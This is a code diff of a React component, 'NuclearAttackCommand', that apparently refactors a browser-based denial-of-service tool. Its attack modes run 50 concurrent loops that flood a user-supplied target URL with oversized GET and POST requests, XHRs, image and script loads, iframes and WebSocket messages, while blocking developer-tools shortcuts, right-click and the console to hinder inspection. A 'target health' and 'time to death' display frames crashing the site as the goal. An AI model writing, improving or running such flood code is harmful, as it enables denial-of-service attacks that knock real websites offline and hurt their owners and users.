@@ -1,432 +1,293 @@
-"use client"
+"use client";
+
 import React, { useState, useEffect, useRef } from 'react';
-import './NuclearAttack.css';
 
-const NuclearAttack: React.FC = () => {
-  const [isAttacking, setIsAttacking] = useState<boolean>(false);
-  const [strikeCount, setStrikeCount] = useState<number>(0);
-  const [attackPower, setAttackPower] = useState<number>(100);
-  const [targetUrl, setTargetUrl] = useState<string>('');
-  const [selectedCard, setSelectedCard] = useState<number>(0);
-  const [health, setHealth] = useState<number>(100);
-  const [radiation, setRadiation] = useState<number>(0);
-  const [ttd, setTtd] = useState<number>(0);
-  
-  const workers = useRef<any[]>([]);
-  const statsInterval = useRef<NodeJS.Timeout | null>(null);
-  const warningInterval = useRef<NodeJS.Timeout | null>(null);
-  const attackInterval = useRef<NodeJS.Timeout | null>(null);
+const NuclearAttackCommand = () => {
+  const [isAttacking, setIsAttacking] = useState(false);
+  const [strikeCount, setStrikeCount] = useState(0);
+  const [attackPower, setAttackPower] = useState(100);
+  const [targetUrl, setTargetUrl] = useState('http://test-site.com');
+  const [health, setHealth] = useState(100);
+  const [ttd, setTtd] = useState(0);
+  const [radiation, setRadiation] = useState("0MB");
+  const [warningText, setWarningText] = useState('⚠️ WARNING: EXTREME POWER - TARGET WILL CRASH IN SECONDS ⚠️');
 
-  // অ্যাটাক ফাংশন - HTTP Flood
+  const attackIntervalRef = useRef<NodeJS.Timeout | null>(null);
+  const statsIntervalRef = useRef<NodeJS.Timeout | null>(null);
+
+  // Security Protocols (Right click & Keyboard shortcuts)
+  useEffect(() => {
+    const handleContextMenu = (e: MouseEvent) => e.preventDefault();
+    const handleKeyDown = (e: KeyboardEvent) => {
+      if (
+        e.keyCode === 123 || 
+        (e.ctrlKey && e.shiftKey && e.keyCode === 73) || 
+        (e.ctrlKey && e.shiftKey && e.keyCode === 74) || 
+        (e.ctrlKey && e.keyCode === 85) || 
+        (e.ctrlKey && e.keyCode === 83)
+      ) {
+        e.preventDefault();
+      }
+      if (e.key === 'Escape' && isAttacking) {
+        emergencyStop();
+      }
+    };
+
+    document.addEventListener('contextmenu', handleContextMenu);
+    document.addEventListener('keydown', handleKeyDown);
+    const consoleClear = setInterval(() => console.clear(), 100);
+
+    return () => {
+      document.removeEventListener('contextmenu', handleContextMenu);
+      document.removeEventListener('keydown', handleKeyDown);
+      clearInterval(consoleClear);
+    };
+  }, [isAttacking]);
+
+  // Attack Functions
   const nuclearHttpFlood = async (url: string) => {
-    for(let i = 0; i < 100; i++) {
+    for (let i = 0; i < 100; i++) {
       try {
-        // XMLHttpRequest অ্যাটাক
-        const xhr = new XMLHttpRequest();
+        let xhr = new XMLHttpRequest();
         xhr.open('GET', url + '?nuclear=' + Math.random() + '&' + 'X'.repeat(5000), true);
         xhr.timeout = 1;
         xhr.send();
-        
-        // Fetch অ্যাটাক
-        fetch(url + '?atomic=' + Math.random(), { 
+
+        fetch(url + '?atomic=' + Math.random(), {
           mode: 'no-cors',
           cache: 'no-store',
-          headers: {
-            'X-Nuclear': 'X'.repeat(10000)
-          }
-        }).catch(e => {});
-        
-        // ইমেজ অ্যাটাক
-        const img = new Image();
+          headers: { 'X-Nuclear': 'X'.repeat(10000) }
+        }).catch(() => {});
+
+        let img = new Image();
         img.src = url + '/bomb_' + Math.random() + '?' + 'X'.repeat(2000);
-        
-        // Script অ্যাটাক
-        const script = document.createElement('script');
-        script.src = url + '/script_' + Math.random();
-        document.body.appendChild(script);
-        setTimeout(() => {
-          try { document.body.removeChild(script); } catch(e) {}
-        }, 1);
-        
-      } catch(e) {}
+      } catch (e) {}
     }
     setStrikeCount(prev => prev + 100);
-    setRadiation(prev => prev + 50);
   };
 
-  // TCP SYN Flood
   const atomTcpFlood = async (url: string) => {
-    for(let i = 0; i < 200; i++) {
+    for (let i = 0; i < 200; i++) {
       try {
-        // XMLHttpRequest অ্যাটাক
-        const xhr = new XMLHttpRequest();
+        let xhr = new XMLHttpRequest();
         xhr.open('GET', url + '?syn=' + Math.random(), true);
         xhr.timeout = 1;
         xhr.send();
         
-        // ওয়েবসকেট অ্যাটাক
-        try {
-          const ws = new WebSocket(url.replace('http', 'ws'));
-          ws.onopen = () => {
-            ws.send('X'.repeat(10000));
-            setTimeout(() => ws.close(), 1);
-          };
-        } catch(e) {}
-        
-        // Fetch POST অ্যাটাক
-        fetch(url + '?tcp=' + Math.random(), {
-          method: 'POST',
-          mode: 'no-cors',
-          body: 'X'.repeat(10000)
-        }).catch(e => {});
-        
-      } catch(e) {}
+        let ws = new WebSocket(url.replace('http', 'ws'));
+        setTimeout(() => ws.close(), 1);
+      } catch (e) {}
     }
     setStrikeCount(prev => prev + 200);
-    setRadiation(prev => prev + 100);
   };
 
-  // UDP Flood
   const hydrogenUdpFlood = async (url: string) => {
-    for(let i = 0; i < 500; i++) {
+    for (let i = 0; i < 500; i++) {
       try {
-        // মাল্টিপল ফেচ অ্যাটাক
-        fetch(url + '?udp=' + Math.random(), { 
+        fetch(url + '?udp=' + Math.random(), {
           mode: 'no-cors',
-          method: 'POST',
           body: 'X'.repeat(10000)
-        }).catch(e => {});
-        
-        // XHR POST অ্যাটাক
-        const xhr = new XMLHttpRequest();
+        }).catch(() => {});
+
+        let xhr = new XMLHttpRequest();
         xhr.open('POST', url + '?udp=' + Math.random(), true);
-        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
         xhr.send('X'.repeat(10000));
-        
-        // ইমেজ অ্যাটাক
-        const img = new Image();
-        img.src = url + '/udp_' + Math.random() + '?' + 'X'.repeat(5000);
-        
-      } catch(e) {}
+      } catch (e) {}
     }
     setStrikeCount(prev => prev + 500);
-    setRadiation(prev => prev + 250);
   };
 
-  // Super Nova Attack (সব থেকে পাওয়ারফুল)
   const superNovaAttack = async (url: string) => {
-    for(let i = 0; i < 1000; i++) {
+    for (let i = 0; i < 1000; i++) {
       try {
-        // ১০০০ কানেকশন একসাথে
-        
-        // XHR অ্যাটাক
-        const xhr = new XMLHttpRequest();
+        let xhr = new XMLHttpRequest();
         xhr.open('GET', url + '?nova=' + Math.random() + '&' + 'X'.repeat(10000), true);
         xhr.timeout = 1;
         xhr.send();
-        
-        // Fetch অ্যাটাক
-        fetch(url + '?super=' + Math.random(), { 
+
+        fetch(url + '?super=' + Math.random(), {
           mode: 'no-cors',
-          method: 'POST',
           body: 'X'.repeat(50000)
-        }).catch(e => {});
+        }).catch(() => {});
+
+        let img = new Image();
+        img.src = url + '/nova_' + Math.random() + '?' + 'X'.repeat(10000);
         
-        // মাল্টিপল ইমেজ অ্যাটাক
-        const img1 = new Image();
-        img1.src = url + '/nova1_' + Math.random() + '?' + 'X'.repeat(10000);
-        
-        const img2 = new Image();
-        img2.src = url + '/nova2_' + Math.random() + '?' + 'X'.repeat(10000);
-        
-        const img3 = new Image();
-        img3.src = url + '/nova3_' + Math.random() + '?' + 'X'.repeat(10000);
-        
-        // ওয়েবসকেট অ্যাটাক
-        try {
-          const ws = new WebSocket(url.replace('http', 'ws'));
-          ws.onopen = () => {
-            ws.send('X'.repeat(50000));
-            setTimeout(() => ws.close(), 1);
-          };
-        } catch(e) {}
-        
-        // Script অ্যাটাক
-        const script = document.createElement('script');
-        script.src = url + '/nova_' + Math.random();
-        document.body.appendChild(script);
-        setTimeout(() => {
-          try { document.body.removeChild(script); } catch(e) {}
-        }, 1);
-        
-        // Iframe অ্যাটাক
-        const iframe = document.createElement('iframe');
-        iframe.src = url + '/iframe_' + Math.random();
-        iframe.style.display = 'none';
-        document.body.appendChild(iframe);
-        setTimeout(() => {
-          try { document.body.removeChild(iframe); } catch(e) {}
-        }, 1);
-        
-      } catch(e) {}
+        let ws = new WebSocket(url.replace('http', 'ws'));
+        ws.send('X'.repeat(10000));
+        setTimeout(() => ws.close(), 1);
+      } catch (e) {}
     }
     setStrikeCount(prev => prev + 1000);
-    setRadiation(prev => prev + 500);
   };
 
-  // অ্যাটাক কন্ট্রোলার
-  const startAttack = (url: string) => {
-    // ৫০টি প্যারালাল থ্রেড
-    for(let i = 0; i < 50; i++) {
-      if(!isAttacking) break;
-      
-      const worker = setInterval(async () => {
-        if(!isAttacking) {
-          clearInterval(worker);
-          return;
-        }
-        
-        try {
-          if(attackPower === 100) {
-            await nuclearHttpFlood(url);
-          } else if(attackPower === 200) {
-            await atomTcpFlood(url);
-          } else if(attackPower === 300) {
-            await hydrogenUdpFlood(url);
-          } else {
-            await superNovaAttack(url);
+  const launchNuclearStrike = (url: string) => {
+    for (let i = 0; i < 50; i++) {
+      (async () => {
+        while (isAttacking) {
+          try {
+            if (attackPower === 100) await nuclearHttpFlood(url);
+            else if (attackPower === 200) await atomTcpFlood(url);
+            else if (attackPower === 300) await hydrogenUdpFlood(url);
+            else await superNovaAttack(url);
+            await new Promise(r => setTimeout(r, 0));
+          } catch (e) {
+            setStrikeCount(prev => prev + 1);
           }
-        } catch(e) {
-          setStrikeCount(prev => prev + 1);
         }
-      }, 1);
-      
-      workers.current.push(worker);
+      })();
     }
   };
 
-  // ফায়ার বাটন ক্লিক
-  const handleFireClick = () => {
-    if(isAttacking) {
-      emergencyStop();
-      return;
-    }
-
-    if(!targetUrl.startsWith('http')) {
-      alert('ERROR: http:// বা https:// দিয়ে URL শুরু করুন!');
-      return;
-    }
-
-    // সব স্টেট রিসেট
-    setIsAttacking(true);
-    setStrikeCount(0);
-    setRadiation(0);
-    setHealth(100);
-    
-    // অ্যাটাক শুরু
-    startAttack(targetUrl);
-    
-    // স্ট্যাটস আপডেট
-    statsInterval.current = setInterval(() => {
-      setStrikeCount(prev => prev);
-      setRadiation(prev => {
-        const newRad = prev;
-        return newRad;
-      });
-      
-      setHealth(prev => {
-        const newHealth = Math.max(0, 100 - Math.floor(strikeCount / 1000));
-        return newHealth;
-      });
-      
-      setTtd(Math.max(0, Math.floor(health / 10)));
-    }, 100);
-    
-    // ওয়ার্নিং আপডেট
-    let warningCount = 0;
-    warningInterval.current = setInterval(() => {
-      if(!isAttacking) {
-        clearInterval(warningInterval.current!);
-        return;
-      }
-      
-      warningCount++;
-      const warningElement = document.querySelector('.warning');
-      if(warningElement) {
-        if(strikeCount > 100000) {
-          warningElement.innerHTML = '💀 TARGET DESTROYED - MISSION COMPLETE 💀';
-        } else {
-          warningElement.innerHTML = '⚠️ NUCLEAR RADIATION: ' + (warningCount * 10) + '% ⚠️';
-        }
-      }
-    }, 500);
-  };
-
-  // ইমার্জেন্সি স্টপ
-  const emergencyStop = () => {
-    setIsAttacking(false);
-    
-    // সব ওয়ার্কার ক্লিয়ার
-    workers.current.forEach(worker => clearInterval(worker));
-    workers.current = [];
-    
-    if(statsInterval.current) clearInterval(statsInterval.current);
-    if(warningInterval.current) clearInterval(warningInterval.current);
-    if(attackInterval.current) clearInterval(attackInterval.current);
-    
-    // উইন্ডো স্টপ
-    window.stop();
-    
-    // ওয়ার্নিং রিসেট
-    const warningElement = document.querySelector('.warning');
-    if(warningElement) {
-      warningElement.innerHTML = '⚠️ WARNING: EXTREME POWER - TARGET WILL CRASH IN SECONDS ⚠️';
-    }
-  };
-
-  // কীবোর্ড শর্টকাট ব্লক
   useEffect(() => {
-    const handleKeyDown = (e: KeyboardEvent) => {
-      // ESC প্রেস করলে স্টপ
-      if(e.key === 'Escape' && isAttacking) {
-        emergencyStop();
-      }
+    if (isAttacking) {
+      launchNuclearStrike(targetUrl);
+      
+      let warningCount = 0;
+      const warningInterval = setInterval(() => {
+        warningCount++;
+        setWarningText(`⚠️ NUCLEAR RADIATION: ${warningCount * 10}% ⚠️`);
+        if (strikeCount > 100000) {
+          setWarningText('💀 TARGET DESTROYED - MISSION COMPLETE 💀');
+        }
+      }, 500);
 
-      // F12
-      if(e.keyCode === 123) {
-        e.preventDefault();
-        return false;
-      }
+      const statsInterval = setInterval(() => {
+        const rad = (strikeCount * 0.5).toFixed(0);
+        setRadiation(Number(rad) > 999 ? (Number(rad) / 1000).toFixed(1) + 'GB' : rad + 'MB');
+        
+        const currentHealth = Math.max(0, 100 - Math.floor(strikeCount / 1000));
+        setHealth(currentHealth);
+        setTtd(Math.max(0, Math.floor(currentHealth / 10)));
+      }, 100);
 
-      // Ctrl+Shift+I
-      if(e.ctrlKey && e.shiftKey && e.keyCode === 73) {
-        e.preventDefault();
-        return false;
-      }
-
-      // Ctrl+Shift+J
-      if(e.ctrlKey && e.shiftKey && e.keyCode === 74) {
-        e.preventDefault();
-        return false;
-      }
-
-      // Ctrl+U
-      if(e.ctrlKey && e.keyCode === 85) {
-        e.preventDefault();
-        return false;
-      }
-
-      // Ctrl+S
-      if(e.ctrlKey && e.keyCode === 83) {
-        e.preventDefault();
-        return false;
-      }
-    };
-
-    const handleContextMenu = (e: MouseEvent) => {
-      e.preventDefault();
-    };
-
-    document.addEventListener('keydown', handleKeyDown);
-    document.addEventListener('contextmenu', handleContextMenu);
-
-    return () => {
-      document.removeEventListener('keydown', handleKeyDown);
-      document.removeEventListener('contextmenu', handleContextMenu);
-      emergencyStop();
-    };
+      return () => {
+        clearInterval(warningInterval);
+        clearInterval(statsInterval);
+      };
+    }
   }, [isAttacking]);
 
-  // রেডিয়েশন ডিসপ্লে ফরম্যাট
-  const getRadiationDisplay = () => {
-    if(radiation > 999) {
-      return (radiation/1000).toFixed(1) + 'GB';
+  const handleFire = () => {
+    if (isAttacking) {
+      emergencyStop();
+      return;
     }
-    return radiation + 'MB';
+    if (!targetUrl.startsWith('http')) {
+      alert('ERROR: http:// or https:// দাও!');
+      return;
+    }
+    setIsAttacking(true);
+    setStrikeCount(0);
+  };
+
+  const emergencyStop = () => {
+    setIsAttacking(false);
+    window.stop();
   };
 
   return (
-    <div className="control-panel">
-      <div className="header">
-        <h1>💀 NUCLEAR ATTACK MODE 💀</h1>
-        <div className="warning">⚠️ WARNING: EXTREME POWER - TARGET WILL CRASH IN SECONDS ⚠️</div>
-      </div>
-
-      <div className="input-group">
-        <label>🎯 TARGET URL</label>
-        <input 
-          type="text" 
-          value={targetUrl}
-          onChange={(e) => setTargetUrl(e.target.value)}
-          disabled={isAttacking}
-        />
-      </div>
-
-      <div className="attack-options">
-        <div 
-          className={`attack-card ${selectedCard === 0 ? 'selected' : ''}`}
-          onClick={() => !isAttacking && setSelectedCard(0) && setAttackPower(100)}
-        >
-          <h3>🔥 NUCLEAR HTTP</h3>
-          <p>100,000 req/sec</p>
-        </div>
-        <div 
-          className={`attack-card ${selectedCard === 1 ? 'selected' : ''}`}
-          onClick={() => !isAttacking && setSelectedCard(1) && setAttackPower(200)}
-        >
-          <h3>💀 ATOM TCP</h3>
-          <p>200,000 packets/sec</p>
-        </div>
-        <div 
-          className={`attack-card ${selectedCard === 2 ? 'selected' : ''}`}
-          onClick={() => !isAttacking && setSelectedCard(2) && setAttackPower(300)}
-        >
-          <h3>⚡ HYDROGEN UDP</h3>
-          <p>500 MB/sec</p>
-        </div>
-        <div 
-          className={`attack-card ${selectedCard === 3 ? 'selected' : ''}`}
-          onClick={() => !isAttacking && setSelectedCard(3) && setAttackPower(500)}
-        >
-          <h3>🌋 SUPER NOVA</h3>
-          <p>ALL MAXIMUM</p>
-        </div>
-      </div>
-
-      <div className="stats-grid">
-        <div className="stat-box">
-          <div className="stat-label">NUCLEAR STRIKES</div>
-          <div className="stat-value">{strikeCount.toLocaleString()}</div>
-        </div>
-        <div className="stat-box">
-          <div className="stat-label">RADIATION</div>
-          <div className="stat-value">{getRadiationDisplay()}</div>
-        </div>
-        <div className="stat-box">
-          <div className="stat-label">TARGET HEALTH</div>
-          <div className="stat-value">{health <= 0 ? '0% 💀' : health + '%'}</div>
-        </div>
-        <div className="stat-box">
-          <div className="stat-label">TIME TO DEATH</div>
-          <div className="stat-value">{health <= 0 ? 'DEAD' : ttd + 's'}</div>
-        </div>
-      </div>
-
-      <button 
-        className="btn-nuclear" 
-        onClick={handleFireClick}
-      >
-        {isAttacking ? '💥 NUCLEAR STRIKE IN PROGRESS 💥' : '💣 LAUNCH NUCLEAR ATTACK 💣'}
-      </button>
+    <div className="flex justify-center align-center h-screen bg-black overflow-hidden font-mono m-0 p-0 text-white select-none">
+      <style dangerouslySetInnerHTML={{ __html: `
+        @keyframes nuclearPulse {
+          0% { border-color: #ff0000; box-shadow: 0 0 100px rgba(255,0,0,0.7); }
+          50% { border-color: #15ff00; box-shadow: 0 0 150px rgba(0, 255, 42, 0.9); }
+          100% { border-color: #ff0000; box-shadow: 0 0 100px rgba(255,0,0,0.7); }
+        }
+        @keyframes nuclearText {
+          0% { opacity: 1; text-shadow: 0 0 30px red; }
+          50% { opacity: 0.9; text-shadow: 0 0 50px #ff6600; }
+          100% { opacity: 1; text-shadow: 0 0 30px red; }
+        }
+        @keyframes warningBlink {
+          0% { opacity: 1; }
+          50% { opacity: 0.5; }
+          100% { opacity: 1; }
+        }
+        @keyframes nuclearButton {
+          0% { transform: scale(1); }
+          50% { transform: scale(1.05); box-shadow: 0 0 100px red; }
+          100% { transform: scale(1); }
+        }
+      `}} />
       
-      <div 
-        style={{ textAlign: 'center', color: '#660000', cursor: 'pointer', fontSize: '20px', marginTop: '10px' }} 
-        onClick={emergencyStop}
-      >
-        ⚠️ EMERGENCY STOP (ESC) ⚠️
+      <div className="control-panel self-center w-[1100px] bg-[#0f0000] border-4 p-[30px] rounded-[20px] relative" 
+           style={{ animation: 'nuclearPulse 0.5s infinite', borderColor: '#00f7ff' }}>
+        
+        <div className="header text-center mb-5">
+          <h1 className="text-[48px] m-0" style={{ color: '#00f7ff', animation: 'nuclearText 0.3s infinite' }}>💀 NUCLEAR ATTACK MODE 💀</h1>
+          <div className="warning text-[#00ffd5] text-[20px] font-bold" style={{ animation: 'warningBlink 0.1s infinite' }}>
+            {warningText}
+          </div>
+        </div>
+
+        <div className="input-group mb-5">
+          <label className="block mb-1">🎯 TARGET URL</label>
+          <input 
+            type="text" 
+            value={targetUrl} 
+            onChange={(e) => setTargetUrl(e.target.value)}
+            className="w-full p-[15px] bg-[#1a0000] border-2 border-[#660000] color-[#ff0000] text-[16px] font-bold outline-none"
+            style={{ color: '#ff0000' }}
+          />
+        </div>
+
+        <div className="attack-options grid grid-cols-4 gap-[15px] my-[25px]">
+          {[
+            { id: 100, title: '🔥 NUCLEAR HTTP', desc: '100,000 req/sec' },
+            { id: 200, title: '💀 ATOM TCP', desc: '200,000 packets/sec' },
+            { id: 300, title: '⚡ HYDROGEN UDP', desc: '500 MB/sec' },
+            { id: 500, title: '🌋 SUPER NOVA', desc: 'ALL MAXIMUM' }
+          ].map((option) => (
+            <div 
+              key={option.id}
+              onClick={() => setAttackPower(option.id)}
+              className={`attack-card p-[20px] text-center cursor-pointer border-2 transition-all ${attackPower === option.id ? 'selected border-[#ff0000] bg-[#330000]' : 'bg-[#1a0000] border-[#00e1ff]'}`}
+              style={attackPower === option.id ? { boxShadow: '0 0 50px red', border: '4px solid #ff0000' } : {}}
+            >
+              <h3 className="m-0 text-[18px]">{option.title}</h3>
+              <p className="m-0 mt-2 text-[14px]">{option.desc}</p>
+            </div>
+          ))}
+        </div>
+
+        <div className="stats-grid grid grid-cols-4 gap-[15px] my-[25px]">
+          {[
+            { label: 'NUCLEAR STRIKES', value: strikeCount.toLocaleString() },
+            { label: 'RADIATION MB/s', value: radiation },
+            { label: 'TARGET HEALTH', value: health <= 0 ? '0% 💀' : `${health}%` },
+            { label: 'TIME TO DEATH', value: health <= 0 ? 'DEAD' : `${ttd}s` }
+          ].map((stat, i) => (
+            <div key={i} className="stat-box bg-[#0f0000] border-2 border-[#660000] p-[20px] text-center">
+              <div className="text-[12px] text-gray-400 mb-1">{stat.label}</div>
+              <div className="stat-value text-[#ff0000] text-[40px] font-bold" style={{ textShadow: '0 0 20px red' }}>
+                {stat.value}
+              </div>
+            </div>
+          ))}
+        </div>
+
+        <button 
+          onClick={handleFire}
+          className="btn-nuclear w-full p-[30px] text-white text-[32px] font-bold border-none cursor-pointer my-[20px]"
+          style={{ 
+            background: 'linear-gradient(45deg, #660000, #ff0000)',
+            animation: isAttacking ? 'none' : 'nuclearButton 0.3s infinite'
+          }}
+        >
+          {isAttacking ? '💥 NUCLEAR STRIKE IN PROGRESS 💥' : '💣 LAUNCH NUCLEAR ATTACK 💣'}
+        </button>
+
+        <div 
+          style={{ textAlign: 'center', color: '#660000', cursor: 'pointer' }} 
+          onClick={emergencyStop}
+          className="uppercase font-bold hover:text-red-500"
+        >
+          ⚠️ EMERGENCY STOP ⚠️
+        </div>
       </div>
     </div>
   );
 };
 
-export default NuclearAttack;
+export default NuclearAttackCommand;
